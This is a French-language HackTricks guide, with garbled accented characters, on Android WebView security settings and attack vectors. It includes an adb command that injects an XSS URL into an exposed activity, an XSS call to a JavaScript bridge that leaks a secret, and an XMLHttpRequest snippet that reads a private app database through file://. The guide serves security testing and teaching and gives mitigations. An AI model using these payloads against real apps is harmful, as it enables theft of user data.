# Webview Attacks

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Guide sur les configurations et la s√©curit√© de WebView

### Vue d'ensemble des vuln√©rabilit√©s de WebView

Un aspect critique du d√©veloppement Android implique la gestion correcte des WebViews. Ce guide met en √©vidence les configurations cl√©s et les pratiques de s√©curit√© pour att√©nuer les risques associ√©s √† l'utilisation de WebView.

![WebView Example](<../../.gitbook/assets/image (1190).png>)

### **Acc√®s aux fichiers dans les WebViews**

Par d√©faut, les WebViews permettent l'acc√®s aux fichiers. Cette fonctionnalit√© est contr√¥l√©e par la m√©thode `setAllowFileAccess()`, disponible depuis le niveau API Android 3 (Cupcake 1.5). Les applications avec la permission **android.permission.READ\_EXTERNAL\_STORAGE** peuvent lire des fichiers √† partir du stockage externe en utilisant un sch√©ma d'URL de fichier (`file://path/to/file`).

#### **Fonctionnalit√©s obsol√®tes : Acc√®s universel et acc√®s aux fichiers √† partir d'URL**

* **Acc√®s universel √† partir d'URL de fichier** : Cette fonctionnalit√© obsol√®te permettait des requ√™tes inter-origines √† partir d'URL de fichier, posant un risque de s√©curit√© significatif en raison des attaques XSS potentielles. Le param√®tre par d√©faut est d√©sactiv√© (`false`) pour les applications ciblant Android Jelly Bean et les versions plus r√©centes.
* Pour v√©rifier ce param√®tre, utilisez `getAllowUniversalAccessFromFileURLs()`.
* Pour modifier ce param√®tre, utilisez `setAllowUniversalAccessFromFileURLs(boolean)`.
* **Acc√®s aux fichiers √† partir d'URL de fichier** : Cette fonctionnalit√©, √©galement obsol√®te, contr√¥lait l'acc√®s au contenu √† partir d'autres URL de sch√©ma de fichier. Comme l'acc√®s universel, son param√®tre par d√©faut est d√©sactiv√© pour une s√©curit√© accrue.
* Utilisez `getAllowFileAccessFromFileURLs()` pour v√©rifier et `setAllowFileAccessFromFileURLs(boolean)` pour d√©finir.

#### **Chargement s√©curis√© de fichiers**

Pour d√©sactiver l'acc√®s au syst√®me de fichiers tout en acc√©dant aux actifs et ressources, la m√©thode `setAllowFileAccess()` est utilis√©e. Avec Android R et versions ult√©rieures, le param√®tre par d√©faut est `false`.

* V√©rifiez avec `getAllowFileAccess()`.
* Activez ou d√©sactivez avec `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

La classe **WebViewAssetLoader** est l'approche moderne pour charger des fichiers locaux. Elle utilise des URL http(s) pour acc√©der aux actifs et ressources locaux, s'alignant sur la politique de m√™me origine, facilitant ainsi la gestion CORS.

### loadUrl

C'est une fonction courante utilis√©e pour charger des URL arbitraires dans un webview :
```java
webview.loadUrl("<url here>")
```
Ofc, un attaquant potentiel ne devrait jamais √™tre en mesure de **contr√¥ler l'URL** qu'une application va charger.

### **Gestion de JavaScript et des Intent Schemes**

* **JavaScript** : D√©sactiv√© par d√©faut dans les WebViews, il peut √™tre activ√© via `setJavaScriptEnabled()`. Une prudence est conseill√©e car activer JavaScript sans protections appropri√©es peut introduire des vuln√©rabilit√©s de s√©curit√©.
* **Intent Scheme** : Les WebViews peuvent g√©rer le sch√©ma `intent`, ce qui peut conduire √† des exploits s'il n'est pas g√©r√© avec soin. Une vuln√©rabilit√© d'exemple impliquait un param√®tre WebView expos√© "support\_url" qui pouvait √™tre exploit√© pour ex√©cuter des attaques de cross-site scripting (XSS).

![Vulnerable WebView](<../../.gitbook/assets/image (1191).png>)

Exemple d'exploitation utilisant adb :

{% code overflow="wrap" %}
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView ‚Äìes support_url "https://example.com/xss.html"
```
{% endcode %}

### Javascript Bridge

Une fonctionnalit√© est fournie par Android qui permet √† **JavaScript** dans un WebView d'invoquer des **fonctions d'application Android natives**. Cela est r√©alis√© en utilisant la m√©thode `addJavascriptInterface`, qui int√®gre JavaScript avec les fonctionnalit√©s natives d'Android, appel√©e _WebView JavaScript bridge_. Une prudence est conseill√©e car cette m√©thode permet √† toutes les pages dans le WebView d'acc√©der √† l'objet JavaScript Interface enregistr√©, posant un risque de s√©curit√© si des informations sensibles sont expos√©es √† travers ces interfaces.

* **Une extr√™me prudence est requise** pour les applications ciblant les versions Android inf√©rieures √† 4.2 en raison d'une vuln√©rabilit√© permettant l'ex√©cution de code √† distance via du JavaScript malveillant, exploitant la r√©flexion.

#### Implementing a JavaScript Bridge

* **Les interfaces JavaScript** peuvent interagir avec le code natif, comme le montrent les exemples o√π une m√©thode de classe est expos√©e √† JavaScript :
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
* Le pont JavaScript est activ√© en ajoutant une interface au WebView :
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```
* L'exploitation potentielle via JavaScript, par exemple, via une attaque XSS, permet d'appeler des m√©thodes Java expos√©es :
```html
<script>alert(javascriptBridge.getSecret());</script>
```
* Pour att√©nuer les risques, **limitez l'utilisation du pont JavaScript** au code exp√©di√© avec l'APK et emp√™chez le chargement de JavaScript √† partir de sources distantes. Pour les appareils plus anciens, d√©finissez le niveau API minimum √† 17.

### Ex√©cution de Code √† Distance Bas√©e sur la R√©flexion (RCE)

* Une m√©thode document√©e permet d'atteindre la RCE par r√©flexion en ex√©cutant une charge utile sp√©cifique. Cependant, l'annotation `@JavascriptInterface` emp√™che l'acc√®s non autoris√© aux m√©thodes, limitant ainsi la surface d'attaque.

### D√©bogage √† Distance

* **Le d√©bogage √† distance** est possible avec **Chrome Developer Tools**, permettant l'interaction et l'ex√©cution arbitraire de JavaScript dans le contenu WebView.

#### Activation du D√©bogage √† Distance

* Le d√©bogage √† distance peut √™tre activ√© pour tous les WebViews au sein d'une application en :
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
* Pour activer le d√©bogage de mani√®re conditionnelle en fonction de l'√©tat d√©bogable de l'application :
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrer des fichiers arbitraires

* D√©monstration de l'exfiltration de fichiers arbitraires en utilisant un XMLHttpRequest :
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
## R√©f√©rences

* [https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
* [https://github.com/authenticationfailure/WheresMyBrowser.Android](https://github.com/authenticationfailure/WheresMyBrowser.Android)
* [https://developer.android.com/reference/android/webkit/WebView](https://developer.android.com/reference/android/webkit/WebView)
* [https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1](https://medium.com/@justmobilesec/deep-links-webviews-exploitations-part-ii-5c0b118ec6f1)
* [https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I](https://www.justmobilesec.com/en/blog/deep-links-webviews-exploitations-part-I)

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop)!
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
